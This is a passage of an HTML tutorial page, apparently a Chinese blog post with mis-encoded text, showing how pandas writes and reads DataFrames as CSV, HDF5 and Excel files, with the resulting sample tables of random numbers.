å¯¼å…¥å¯¼å‡ºæ•°æ® Getting Data In/Out</h2><h3 id="0x0E-1-CSV"><a href="#0x0E-1-CSV" class="headerlink" title="0x0E-1 CSV"></a>0x0E-1 CSV</h3><p><strong>å†™å…¥ csv æ–‡ä»¶</strong></p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'foo.csv'</span><span class="token punctuation">)</span>  <span class="token comment"># ä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹</span></code></pre><p><strong>ä» csv æ–‡ä»¶ä¸­å¯¼å…¥æ•°æ®</strong></p><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'foo.csv'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Unnamed: 0</th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>2020-01-01</td>      <td>-1.397481</td>      <td>-0.453722</td>      <td>1.374079</td>      <td>-2.095767</td>    </tr>    <tr>      <th>1</th>      <td>2020-01-02</td>      <td>-1.363418</td>      <td>0.529293</td>      <td>0.178497</td>      <td>-2.364989</td>    </tr>    <tr>      <th>2</th>      <td>2020-01-03</td>      <td>-2.047267</td>      <td>-0.333020</td>      <td>0.379978</td>      <td>-2.628204</td>    </tr>    <tr>      <th>3</th>      <td>2020-01-04</td>      <td>-2.305870</td>      <td>-0.145598</td>      <td>-0.232491</td>      <td>-2.812290</td>    </tr>    <tr>      <th>4</th>      <td>2020-01-05</td>      <td>-1.851390</td>      <td>-1.378215</td>      <td>-1.202399</td>      <td>-4.574516</td>    </tr>    <tr>      <th>5</th>      <td>2020-01-06</td>      <td>-3.438928</td>      <td>-0.779975</td>      <td>-1.864979</td>      <td>-5.666847</td>    </tr>    <tr>      <th>6</th>      <td>2020-01-07</td>      <td>-4.201270</td>      <td>-0.827366</td>      <td>-0.796513</td>      <td>-5.267628</td>    </tr>    <tr>      <th>7</th>      <td>2020-01-08</td>      <td>-5.682762</td>      <td>-1.009404</td>      <td>-0.760801</td>      <td>-4.696243</td>    </tr>    <tr>      <th>8</th>      <td>2020-01-09</td>      <td>-4.362126</td>      <td>-0.768552</td>      <td>-0.747517</td>      <td>-5.562345</td>    </tr>    <tr>      <th>9</th>      <td>2020-01-10</td>      <td>-5.226357</td>      <td>-1.791920</td>      <td>0.290504</td>      <td>-5.214061</td>    </tr>    <tr>      <th>10</th>      <td>2020-01-11</td>      <td>-4.429691</td>      <td>-2.026951</td>      <td>-0.821212</td>      <td>-6.621030</td>    </tr>    <tr>      <th>11</th>      <td>2020-01-12</td>      <td>-4.222744</td>      <td>-2.875169</td>      <td>-0.654313</td>      <td>-5.926621</td>    </tr>    <tr>      <th>12</th>      <td>2020-01-13</td>      <td>-2.413314</td>      <td>-3.329878</td>      <td>-1.595397</td>      <td>-5.585677</td>    </tr>    <tr>      <th>13</th>      <td>2020-01-14</td>      <td>-2.769944</td>      <td>-3.536045</td>      <td>-1.463671</td>      <td>-5.098753</td>    </tr>    <tr>      <th>14</th>      <td>2020-01-15</td>      <td>-3.599683</td>      <td>-4.973067</td>      <td>-3.859425</td>      <td>-5.823875</td>    </tr>    <tr>      <th>15</th>      <td>2020-01-16</td>      <td>-3.486154</td>      <td>-4.792330</td>      <td>-2.866047</td>      <td>-6.312086</td>    </tr>    <tr>      <th>16</th>      <td>2020-01-17</td>      <td>-4.232714</td>      <td>-5.082053</td>      <td>-3.572924</td>      <td>-8.478300</td>    </tr>    <tr>      <th>17</th>      <td>2020-01-18</td>      <td>-5.346857</td>      <td>-5.787422</td>      <td>-4.313125</td>      <td>-8.595854</td>    </tr>    <tr>      <th>18</th>      <td>2020-01-19</td>      <td>-5.720494</td>      <td>-5.620498</td>      <td>-3.699862</td>      <td>-9.678113</td>    </tr>    <tr>      <th>19</th>      <td>2020-01-20</td>      <td>-5.264735</td>      <td>-4.938944</td>      <td>-2.354040</td>      <td>-8.942524</td>    </tr>    <tr>      <th>20</th>      <td>2020-01-21</td>      <td>-5.407854</td>      <td>-5.379811</td>      <td>-2.284447</td>      <td>-8.068545</td>    </tr>    <tr>      <th>21</th>      <td>2020-01-22</td>      <td>-5.793401</td>      <td>-5.501279</td>      <td>-2.254013</td>      <td>-7.997644</td>    </tr>    <tr>      <th>22</th>      <td>2020-01-23</td>      <td>-6.796539</td>      <td>-4.692782</td>      <td>-2.330458</td>      <td>-7.449650</td>    </tr>    <tr>      <th>23</th>      <td>2020-01-24</td>      <td>-7.502072</td>      <td>-4.085084</td>      <td>-1.810495</td>      <td>-6.540544</td>    </tr>    <tr>      <th>24</th>      <td>2020-01-25</td>      <td>-7.639024</td>      <td>-3.791416</td>      <td>1.214301</td>      <td>-7.599166</td>    </tr>    <tr>      <th>25</th>      <td>2020-01-26</td>      <td>-7.783544</td>      <td>-2.180918</td>      <td>1.628560</td>      <td>-7.928116</td>    </tr>    <tr>      <th>26</th>      <td>2020-01-27</td>      <td>-7.673699</td>      <td>-3.485888</td>      <td>0.640970</td>      <td>-8.124872</td>    </tr>    <tr>      <th>27</th>      <td>2020-01-28</td>      <td>-7.435098</td>      <td>-4.480212</td>      <td>-0.409425</td>      <td>-7.943383</td>    </tr>    <tr>      <th>28</th>      <td>2020-01-29</td>      <td>-6.843557</td>      <td>-5.069680</td>      <td>-1.650871</td>      <td>-7.311741</td>    </tr>    <tr>      <th>29</th>      <td>2020-01-30</td>      <td>-7.647267</td>      <td>-4.115332</td>      <td>-1.558887</td>      <td>-6.308304</td>    </tr>    <tr>      <th>...</th>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <th>970</th>      <td>2022-08-28</td>      <td>17.157914</td>      <td>-23.306973</td>      <td>-12.461653</td>      <td>-2.478731</td>    </tr>    <tr>      <th>971</th>      <td>2022-08-29</td>      <td>18.207251</td>      <td>-23.725280</td>      <td>-12.912440</td>      <td>-2.664828</td>    </tr>    <tr>      <th>972</th>      <td>2022-08-30</td>      <td>17.968302</td>      <td>-21.485150</td>      <td>-15.044877</td>      <td>-4.034060</td>    </tr>    <tr>      <th>973</th>      <td>2022-08-31</td>      <td>18.933869</td>      <td>-21.587237</td>      <td>-16.046081</td>      <td>-4.014128</td>    </tr>    <tr>      <th>974</th>      <td>2022-09-01</td>      <td>18.337284</td>      <td>-21.451739</td>      <td>-15.028398</td>      <td>-4.147177</td>    </tr>    <tr>      <th>975</th>      <td>2022-09-02</td>      <td>18.783912</td>      <td>-21.096423</td>      <td>-15.506137</td>      <td>-3.858413</td>    </tr>    <tr>      <th>976</th>      <td>2022-09-03</td>      <td>18.828378</td>      <td>-19.514168</td>      <td>-16.924864</td>      <td>-2.559397</td>    </tr>    <tr>      <th>977</th>      <td>2022-09-04</td>      <td>18.570511</td>      <td>-21.482747</td>      <td>-17.147155</td>      <td>-4.267082</td>    </tr>    <tr>      <th>978</th>      <td>2022-09-05</td>      <td>17.212119</td>      <td>-22.331837</td>      <td>-16.496095</td>      <td>-5.990857</td>    </tr>    <tr>      <th>979</th>      <td>2022-09-06</td>      <td>15.726498</td>      <td>-23.219830</td>      <td>-19.321023</td>      <td>-5.281962</td>    </tr>    <tr>      <th>980</th>      <td>2022-09-07</td>      <td>16.053999</td>      <td>-22.681168</td>      <td>-19.139536</td>      <td>-5.587482</td>    </tr>    <tr>      <th>981</th>      <td>2022-09-08</td>      <td>17.335456</td>      <td>-23.320514</td>      <td>-21.271891</td>      <td>-4.048170</td>    </tr>    <tr>      <th>982</th>      <td>2022-09-09</td>      <td>16.925567</td>      <td>-24.175782</td>      <td>-22.318101</td>      <td>-4.890968</td>    </tr>    <tr>      <th>983</th>      <td>2022-09-10</td>      <td>18.652048</td>      <td>-25.436089</td>      <td>-22.213175</td>      <td>-6.330027</td>    </tr>    <tr>      <th>984</th>      <td>2022-09-11</td>      <td>19.535978</td>      <td>-25.673818</td>      <td>-23.064392</td>      <td>-5.673334</td>    </tr>    <tr>      <th>985</th>      <td>2022-09-12</td>      <td>19.632355</td>      <td>-26.369119</td>      <td>-22.953900</td>      <td>-3.463010</td>    </tr>    <tr>      <th>986</th>      <td>2022-09-13</td>      <td>18.792587</td>      <td>-25.430236</td>      <td>-23.672206</td>      <td>-2.292810</td>    </tr>    <tr>      <th>987</th>      <td>2022-09-14</td>      <td>21.200064</td>      <td>-26.299390</td>      <td>-23.567706</td>      <td>-2.753986</td>    </tr>    <tr>      <th>988</th>      <td>2022-09-15</td>      <td>22.890536</td>      <td>-27.813985</td>      <td>-23.938164</td>      <td>-3.195772</td>    </tr>    <tr>      <th>989</th>      <td>2022-09-16</td>      <td>23.138447</td>      <td>-25.855344</td>      <td>-24.390078</td>      <td>-3.612660</td>    </tr>    <tr>      <th>990</th>      <td>2022-09-17</td>      <td>23.163567</td>      <td>-26.157774</td>      <td>-24.309178</td>      <td>-3.155928</td>    </tr>    <tr>      <th>991</th>      <td>2022-09-18</td>      <td>20.973996</td>      <td>-27.319631</td>      <td>-22.948785</td>      <td>-4.487101</td>    </tr>    <tr>      <th>992</th>      <td>2022-09-19</td>      <td>21.090756</td>      <td>-26.712847</td>      <td>-21.722990</td>      <td>-4.110810</td>    </tr>    <tr>      <th>993</th>      <td>2022-09-20</td>      <td>21.848391</td>      <td>-25.018472</td>      <td>-21.850579</td>      <td>-4.360523</td>    </tr>    <tr>      <th>994</th>      <td>2022-09-21</td>      <td>22.898217</td>      <td>-26.005364</td>      <td>-20.914269</td>      <td>-5.357187</td>    </tr>    <tr>      <th>995</th>      <td>2022-09-22</td>      <td>21.978310</td>      <td>-25.001244</td>      <td>-20.881626</td>      <td>-5.606849</td>    </tr>    <tr>      <th>996</th>      <td>2022-09-23</td>      <td>24.132628</td>      <td>-25.692639</td>      <td>-20.310265</td>      <td>-6.258977</td>    </tr>    <tr>      <th>997</th>      <td>2022-09-24</td>      <td>23.777794</td>      <td>-25.485527</td>      <td>-21.305882</td>      <td>-5.330284</td>    </tr>    <tr>      <th>998</th>      <td>2022-09-25</td>      <td>25.105611</td>      <td>-25.485135</td>      <td>-22.407657</td>      <td>-6.600228</td>    </tr>    <tr>      <th>999</th>      <td>2022-09-26</td>      <td>25.207099</td>      <td>-25.512208</td>      <td>-23.434955</td>      <td>-7.275999</td>    </tr>  </tbody></table><p>1000 rows Ã— 5 columns</p></div><h3 id="0x0E-2-HDF5"><a href="#0x0E-2-HDF5" class="headerlink" title="0x0E-2 HDF5"></a>0x0E-2 HDF5</h3><p><strong>å†™å…¥ HDF5 å­˜å‚¨</strong></p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>to_hdf<span class="token punctuation">(</span><span class="token string">'foo.h5'</span><span class="token punctuation">,</span><span class="token string">'df'</span><span class="token punctuation">)</span></code></pre><p><strong>ä» HDF5 å­˜å‚¨ä¸­è¯»å–æ•°æ®</strong></p><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>read_hdf<span class="token punctuation">(</span><span class="token string">'foo.h5'</span><span class="token punctuation">,</span><span class="token string">'df'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-01-01</th>      <td>-1.397481</td>      <td>-0.453722</td>      <td>1.374079</td>      <td>-2.095767</td>    </tr>    <tr>      <th>2020-01-02</th>      <td>-1.363418</td>      <td>0.529293</td>      <td>0.178497</td>      <td>-2.364989</td>    </tr>    <tr>      <th>2020-01-03</th>      <td>-2.047267</td>      <td>-0.333020</td>      <td>0.379978</td>      <td>-2.628204</td>    </tr>    <tr>      <th>2020-01-04</th>      <td>-2.305870</td>      <td>-0.145598</td>      <td>-0.232491</td>      <td>-2.812290</td>    </tr>    <tr>      <th>2020-01-05</th>      <td>-1.851390</td>      <td>-1.378215</td>      <td>-1.202399</td>      <td>-4.574516</td>    </tr>    <tr>      <th>2020-01-06</th>      <td>-3.438928</td>      <td>-0.779975</td>      <td>-1.864979</td>      <td>-5.666847</td>    </tr>    <tr>      <th>2020-01-07</th>      <td>-4.201270</td>      <td>-0.827366</td>      <td>-0.796513</td>      <td>-5.267628</td>    </tr>    <tr>      <th>2020-01-08</th>      <td>-5.682762</td>      <td>-1.009404</td>      <td>-0.760801</td>      <td>-4.696243</td>    </tr>    <tr>      <th>2020-01-09</th>      <td>-4.362126</td>      <td>-0.768552</td>      <td>-0.747517</td>      <td>-5.562345</td>    </tr>    <tr>      <th>2020-01-10</th>      <td>-5.226357</td>      <td>-1.791920</td>      <td>0.290504</td>      <td>-5.214061</td>    </tr>    <tr>      <th>2020-01-11</th>      <td>-4.429691</td>      <td>-2.026951</td>      <td>-0.821212</td>      <td>-6.621030</td>    </tr>    <tr>      <th>2020-01-12</th>      <td>-4.222744</td>      <td>-2.875169</td>      <td>-0.654313</td>      <td>-5.926621</td>    </tr>    <tr>      <th>2020-01-13</th>      <td>-2.413314</td>      <td>-3.329878</td>      <td>-1.595397</td>      <td>-5.585677</td>    </tr>    <tr>      <th>2020-01-14</th>      <td>-2.769944</td>      <td>-3.536045</td>      <td>-1.463671</td>      <td>-5.098753</td>    </tr>    <tr>      <th>2020-01-15</th>      <td>-3.599683</td>      <td>-4.973067</td>      <td>-3.859425</td>      <td>-5.823875</td>    </tr>    <tr>      <th>2020-01-16</th>      <td>-3.486154</td>      <td>-4.792330</td>      <td>-2.866047</td>      <td>-6.312086</td>    </tr>    <tr>      <th>2020-01-17</th>      <td>-4.232714</td>      <td>-5.082053</td>      <td>-3.572924</td>      <td>-8.478300</td>    </tr>    <tr>      <th>2020-01-18</th>      <td>-5.346857</td>      <td>-5.787422</td>      <td>-4.313125</td>      <td>-8.595854</td>    </tr>    <tr>      <th>2020-01-19</th>      <td>-5.720494</td>      <td>-5.620498</td>      <td>-3.699862</td>      <td>-9.678113</td>    </tr>    <tr>      <th>2020-01-20</th>      <td>-5.264735</td>      <td>-4.938944</td>      <td>-2.354040</td>      <td>-8.942524</td>    </tr>    <tr>      <th>2020-01-21</th>      <td>-5.407854</td>      <td>-5.379811</td>      <td>-2.284447</td>      <td>-8.068545</td>    </tr>    <tr>      <th>2020-01-22</th>      <td>-5.793401</td>      <td>-5.501279</td>      <td>-2.254013</td>      <td>-7.997644</td>    </tr>    <tr>      <th>2020-01-23</th>      <td>-6.796539</td>      <td>-4.692782</td>      <td>-2.330458</td>      <td>-7.449650</td>    </tr>    <tr>      <th>2020-01-24</th>      <td>-7.502072</td>      <td>-4.085084</td>      <td>-1.810495</td>      <td>-6.540544</td>    </tr>    <tr>      <th>2020-01-25</th>      <td>-7.639024</td>      <td>-3.791416</td>      <td>1.214301</td>      <td>-7.599166</td>    </tr>    <tr>      <th>2020-01-26</th>      <td>-7.783544</td>      <td>-2.180918</td>      <td>1.628560</td>      <td>-7.928116</td>    </tr>    <tr>      <th>2020-01-27</th>      <td>-7.673699</td>      <td>-3.485888</td>      <td>0.640970</td>      <td>-8.124872</td>    </tr>    <tr>      <th>2020-01-28</th>      <td>-7.435098</td>      <td>-4.480212</td>      <td>-0.409425</td>      <td>-7.943383</td>    </tr>    <tr>      <th>2020-01-29</th>      <td>-6.843557</td>      <td>-5.069680</td>      <td>-1.650871</td>      <td>-7.311741</td>    </tr>    <tr>      <th>2020-01-30</th>      <td>-7.647267</td>      <td>-4.115332</td>      <td>-1.558887</td>      <td>-6.308304</td>    </tr>    <tr>      <th>...</th>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <th>2022-08-28</th>      <td>17.157914</td>      <td>-23.306973</td>      <td>-12.461653</td>      <td>-2.478731</td>    </tr>    <tr>      <th>2022-08-29</th>      <td>18.207251</td>      <td>-23.725280</td>      <td>-12.912440</td>      <td>-2.664828</td>    </tr>    <tr>      <th>2022-08-30</th>      <td>17.968302</td>      <td>-21.485150</td>      <td>-15.044877</td>      <td>-4.034060</td>    </tr>    <tr>      <th>2022-08-31</th>      <td>18.933869</td>      <td>-21.587237</td>      <td>-16.046081</td>      <td>-4.014128</td>    </tr>    <tr>      <th>2022-09-01</th>      <td>18.337284</td>      <td>-21.451739</td>      <td>-15.028398</td>      <td>-4.147177</td>    </tr>    <tr>      <th>2022-09-02</th>      <td>18.783912</td>      <td>-21.096423</td>      <td>-15.506137</td>      <td>-3.858413</td>    </tr>    <tr>      <th>2022-09-03</th>      <td>18.828378</td>      <td>-19.514168</td>      <td>-16.924864</td>      <td>-2.559397</td>    </tr>    <tr>      <th>2022-09-04</th>      <td>18.570511</td>      <td>-21.482747</td>      <td>-17.147155</td>      <td>-4.267082</td>    </tr>    <tr>      <th>2022-09-05</th>      <td>17.212119</td>      <td>-22.331837</td>      <td>-16.496095</td>      <td>-5.990857</td>    </tr>    <tr>      <th>2022-09-06</th>      <td>15.726498</td>      <td>-23.219830</td>      <td>-19.321023</td>      <td>-5.281962</td>    </tr>    <tr>      <th>2022-09-07</th>      <td>16.053999</td>      <td>-22.681168</td>      <td>-19.139536</td>      <td>-5.587482</td>    </tr>    <tr>      <th>2022-09-08</th>      <td>17.335456</td>      <td>-23.320514</td>      <td>-21.271891</td>      <td>-4.048170</td>    </tr>    <tr>      <th>2022-09-09</th>      <td>16.925567</td>      <td>-24.175782</td>      <td>-22.318101</td>      <td>-4.890968</td>    </tr>    <tr>      <th>2022-09-10</th>      <td>18.652048</td>      <td>-25.436089</td>      <td>-22.213175</td>      <td>-6.330027</td>    </tr>    <tr>      <th>2022-09-11</th>      <td>19.535978</td>      <td>-25.673818</td>      <td>-23.064392</td>      <td>-5.673334</td>    </tr>    <tr>      <th>2022-09-12</th>      <td>19.632355</td>      <td>-26.369119</td>      <td>-22.953900</td>      <td>-3.463010</td>    </tr>    <tr>      <th>2022-09-13</th>      <td>18.792587</td>      <td>-25.430236</td>      <td>-23.672206</td>      <td>-2.292810</td>    </tr>    <tr>      <th>2022-09-14</th>      <td>21.200064</td>      <td>-26.299390</td>      <td>-23.567706</td>      <td>-2.753986</td>    </tr>    <tr>      <th>2022-09-15</th>      <td>22.890536</td>      <td>-27.813985</td>      <td>-23.938164</td>      <td>-3.195772</td>    </tr>    <tr>      <th>2022-09-16</th>      <td>23.138447</td>      <td>-25.855344</td>      <td>-24.390078</td>      <td>-3.612660</td>    </tr>    <tr>      <th>2022-09-17</th>      <td>23.163567</td>      <td>-26.157774</td>      <td>-24.309178</td>      <td>-3.155928</td>    </tr>    <tr>      <th>2022-09-18</th>      <td>20.973996</td>      <td>-27.319631</td>      <td>-22.948785</td>      <td>-4.487101</td>    </tr>    <tr>      <th>2022-09-19</th>      <td>21.090756</td>      <td>-26.712847</td>      <td>-21.722990</td>      <td>-4.110810</td>    </tr>    <tr>      <th>2022-09-20</th>      <td>21.848391</td>      <td>-25.018472</td>      <td>-21.850579</td>      <td>-4.360523</td>    </tr>    <tr>      <th>2022-09-21</th>      <td>22.898217</td>      <td>-26.005364</td>      <td>-20.914269</td>      <td>-5.357187</td>    </tr>    <tr>      <th>2022-09-22</th>      <td>21.978310</td>      <td>-25.001244</td>      <td>-20.881626</td>      <td>-5.606849</td>    </tr>    <tr>      <th>2022-09-23</th>      <td>24.132628</td>      <td>-25.692639</td>      <td>-20.310265</td>      <td>-6.258977</td>    </tr>    <tr>      <th>2022-09-24</th>      <td>23.777794</td>      <td>-25.485527</td>      <td>-21.305882</td>      <td>-5.330284</td>    </tr>    <tr>      <th>2022-09-25</th>      <td>25.105611</td>      <td>-25.485135</td>      <td>-22.407657</td>      <td>-6.600228</td>    </tr>    <tr>      <th>2022-09-26</th>      <td>25.207099</td>      <td>-25.512208</td>      <td>-23.434955</td>      <td>-7.275999</td>    </tr>  </tbody></table><p>1000 rows Ã— 4 columns</p></div><h3 id="0x0E-3-Excel"><a href="#0x0E-3-Excel" class="headerlink" title="0x0E-3 Excel"></a>0x0E-3 Excel</h3><p>çœ‹ç½‘ä¸Šè¯´ï¼Œç›¸å¯¹äº xlwtã€xlrd ä¹‹ç±»çš„åº“ï¼Œç”¨ pandas æ¥å¯¹ excel è¿›è¡Œ<strong>æ•°æ®å¤„ç†å’Œåˆ†æ</strong>æŒºä¸é”™çš„ï¼Œæ­£å¥½æœ€è¿‘ä¹Ÿæƒ³è¯•è¯•å‘¢ã€‚</p><p><strong>å†™å…¥ Excel</strong></p><pre class="language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>to_excel<span class="token punctuation">(</span><span class="token string">'foo.xlsx'</span><span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">'Sheet1'</span><span class="token punctuation">)</span></code></pre><p><strong>ä» excel ä¸­è¯»å–æ•°æ®</strong></p><pre class="language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'foo.xlsx'</span><span class="token punctuation">,</span> <span class="token string">'Sheet1'</span><span class="token punctuation">,</span> index_col<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> na_values<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'NA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Unnamed: 0</th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>2020-01-01</td>      <td>-1.397481</td>      <td>-0.453722</td>      <td>1.374079</td>      <td>-2.095767</td>    </tr>    <tr>      <th>1</th>      <td>2020-01-02</td>      <td>-1.363418</td>      <td>0.529293</td>      <td>0.178497</td>      <td>-2.364989</td>    </tr>    <tr>      <th>2</th>      <td>2020-01-03</td>      <td>-2.047267</td>      <td>-0.333020</td>      <td>0.379978</td>      <td>-2.628204</td>    </tr>    <tr>      <th>3</th>      <td>2020-01-04</td>      <td>-2.305870</td>      <td>-0.145598</td>      <td>-0.232491</td>      <td>-2.812290</td>    </tr>    <tr>      <th>4</th>      <td>2020-01-05</td>      <td>-1.851390</td>      <td>-1.378215</td>      <td>-1.202399</td>      <td>-4.574516</td>    </tr>    <tr>      <th>5</th>      <td>2020-01-06</td>      <td>-3.438928</td>      <td>-0.779975</td>      <td>-1.864979</td>      <td>-5.666847</td>    </tr>    <tr>      <th>6</th>      <td>2020-01-07</td>      <td>-4.201270</td>      <td>-0.827366</td>      <td>-0.796513</td>      <td>-5.267628</td>    </tr>    <tr>      <th>7</th>      <td>2020-01-08</td>      <td>-5.682762</td>      <td>-1.009404</td>      <td>-0.760801</td>      <td>-4.696243</td>    </tr>    <tr>      <th>8</th>      <td>2020-01-09</td>      <td>-4.362126</td>      <td>-0.768552</td>      <td>-0.747517</td>      <td>-5.562345</td>    </tr>    <tr>      <th>9</th>      <td>2020-01-10</td>      <td>-5.226357</td>      <td>-1.791920</td>      <td>0.290504</td>      <td>-5.214061</td>    </tr>    <tr>      <th>10</th>      <td>2020-01-11</td>      <td>-4.429691</td>      <td>-2.026951</td>      <td>-0.821212</td>      <td>-6.621030</td>    </tr>    <tr>      <th>11</th>      <td>2020-01-12</td>      <td>-4.222744</td>      <td>-2.875169</td>      <td>-0.654313</td>      <td>-5.926621</td>    </tr>    <tr>      <th>12</th>      <td>2020-01-13</td>      <td>-2.413314</td>      <td>-3.329878</td>      <td>-1.595397</td>      <td>-5.585677</td>    </tr>    <tr>      <th>13</th>      <td>2020-01-14</td>      <td>-2.769944</td>      <td>-3.536045</td>      <td>-1.463671</td>      <td>-5.098753</td>    </tr>    <tr>      <th>14</th>      <td>2020-01-15</td>      <td>-3.599683</td>      <td>-4.973067</td>      <td>-3.859425</td>      <td>-5.823875</td>    </tr>    <tr>      <th>15</th>      <td>2020-01-16</td>      <td>-3.486154</td>      <td>-4.792330</td>      <td>-2.866047</td>      <td>-6.312086</td>    </tr>    <tr>      <th>16</th>      <td>2020-01-17</td>      <td>-4.232714</td>      <td>-5.082053</td>      <td>-3.572924</td>      <td>-8.478300</td>    </tr>    <tr>      <th>17</th>      <td>2020-01-18</td>      <td>-5.346857</td>      <td>-5.787422</td>      <td>-4.313125</td>      <td>-8.595854</td>    </tr>    <tr>      <th>18</th>      <td>2020-01-19</td>      <td>-5.720494</td>      <td>-5.620498</td>      <td>-3.699862</td>      <td>-9.678113</td>    </tr>    <tr>      <th>19</th>      <td>2020-01-20</td>      <td>-5.264735</td>      <td>-4.938944</td>      <td>-2.354040</td>      <td>-8.942524</td>    </tr>    <tr>      <th>20</th>      <td>2020-01-21</td>      <td>-5.407854</td>      <td>-5.379811</td>      <td>-2.284447</td>      <td>-8.068545</td>    </tr>    <tr>      <th>21</th>      <td>2020-01-22</td>      <td>-5.793401</td>      <td>-5.501279</td>      <td>-2.254013</td>      <td>-7.997644</td>    </tr>    <tr>      <th>22</th>      <td>2020-01-23</td>      <td>-6.796539</td>      <td>-4.692782</td>      <td>-2.330458</td>      <td>-7.449650</td>    </tr>    <tr>      <th>23</th>      <td>2020-01-24</td>      <td>-7.502072</td>      <td>-4.085084</td>      <td>-1.810495</td>      <td>-6.540544</td>    </tr>    <tr>      <th>24</th>      <td>2020-01-25</td>      <td>-7.639024</td>      <td>-3.791416</td>      <td>1.214301</td>      <td>-7.599166</td>    </tr>    <tr>      <th>25</th>      <td>2020-01-26</td>      <td>-7.783544</td>      <td>-2.180918</td>      <td>1.628560</td>      <td>-7.928116</td>    </tr>    <tr>      <th>26</th>      <td>2020-01-27</td>      <td>-7.673699</td>      <td>-3.485888</td>      <td>0.640970</td>      <td>-8.124872</td>    </tr>    <tr>      <th>27</th>      <td>2020-01-28</td>      <td>-7.435098</td>      <td>-4.480212</td>      <td>-0.409425</td>      <td>-7.943383</td>    </tr>    <tr>      <th>28</th>      <td>2020-01-29</td>      <td>-6.843557</td>      <td>-5.069680</td>      <td>-1.650871</td>      <td>-7.311741</td>    </tr>    <tr>      <th>29</th>      <td>2020-01-30</td>      <td>-7.647267</td>      <td>-4.115332</td>      <td>-1.558887</td>      <td>-6.308304</td>    </tr>    <tr>      <th>...</th>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <th>970</th>      <td>2022-08-28</td>      <td>17.157914</td>      <td>-23.306973</td>      <td>-12.461653</td>      <td>-2.478731</td>    </tr>    <tr>      <th>971</th>      <td>2022-08-29</td>      <td>18.207251</td>      <td>-23.725280</td>      <td>-12.912440</td>      <td>-2.664828</td>    </tr>    <tr>      <th>972</th>      <td>2022-08-30</td>      <td>17.968302</td>      <td>-21.485150</td>      <td>-15.044877</td>      <td>-4.034060</td>    </tr>    <tr>      <th>973</th>      <td>2022-08-31</td>      <td>18.933869</td>      <td>-21.587237</td>      <td>-16.046081</td>      <td>-4.014128</td>    </tr>    <tr>      <th>974</th>      <td>2022-09-01</td>      <td>18.337284</td>      <td>-21.451739</td>      <td>-15.028398</td>      <td>-4.147177</td>    </tr>    <tr>      <th>975</th>      <td>2022-09-02</td>      <td>18.783912</td>      <td>-21.096423</td>      <td>-15.506137</td>      <td>-3.858413</td>    </tr>    <tr>      <th>976</th>      <td>2022-09-03</td>      <td>18.828378</td>      <td>-19.514168</td>      <td>-16.924864</td>      <td>-2.559397</td>    </tr>    <tr>      <th>977</th>      <td>2022-09-04</td>      <td>18.570511</td>      <td>-21.482747</td>      <td>-17.147155</td>      <td>-4.267082</td>    </tr>    <tr>      <th>978</th>      <td>2022-09-05</td>      <td>17.212119</td>      <td>-22.331837</td>      <td>-16.496095</td>      <td>-5.990857</td>    </tr>    <tr>      <th>979</th>      <td>2022-09-06</td>      <td>15.726498</td>      <td>-23.219830</td>      <td>-19.321023</td>      <td>-5.281962</td>    </tr>    <tr>      <th>980</th>      <td>2022-09-07</td>      <td>16.053999</td>      <td>-22.681168</td>      <td>-19.139536</td>      <td>-5.587482</td>    </tr>    <tr>      <th>981</th>      <td>2022-09-08</td>      <td>17.335456</td>      <td>-23.320514</td>      <td>-21.271891</td>      <td>-4.048170</td>    </tr>    <tr>      <th>982</th>      <td>2022-09-09</td>      <td>16.925567</td>      <td>-24.175782</td>      <td>-22.318101</td>      <td>-4.890968</td>    </tr>    <tr>      <th>983</th>      <td>2022-09-10</td>      <td>18.652048</td>      <td>-25.436089</td>      <td>-22.213175</td>      <td>-6.330027</td>    </tr>    <tr>      <th>984</th>      <td>2022-09-11</td>      <td>19.535978</td>      <td>-25.673818</td>      <td>-23.064392</td>      <td>-5.673334</td>    </tr>    <tr>      <th>985</th>      <td>2022-09-12</td>      <td>19.632355</td>      <td>-26.369119</td>      <td>-22.953900</td>      <td>-3.463010</td>    </tr>    <tr>      <th>986</th>      <td>2022-09-13</td>      <td>18.792587</td>      <td>-25.430236</td>      <td>-23.672206</td>      <td>-2.292810</td>    </tr>    <tr>      <th>987</th>      <td>2022-09-14</td>      <td>21.200064</td>      <td>-26.299390</td>      <td>-23.567706</td>      